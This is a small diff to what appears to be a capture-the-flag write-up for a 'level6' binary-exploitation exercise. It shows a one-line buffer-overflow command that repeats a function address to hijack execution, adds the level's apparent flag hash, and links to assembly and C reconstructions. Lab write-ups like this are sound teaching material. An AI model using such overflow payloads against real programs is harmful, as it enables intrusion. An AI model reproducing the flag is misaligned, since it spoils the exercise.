@@ -4,6 +4,7 @@
 
 ```
 ./level6 $(python -c "print '\x54\x84\x04\x08' * 19")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
 ## Explanation
@@ -27,6 +28,10 @@ info function
 0x08048468  m
 0x0804847c  main
 ```
+
+You can view the commented asm code [here](Ressources/assembly.asm)  
+You can view the asm code translated to C [here](source.c)  
+
 
 ### Steps
 
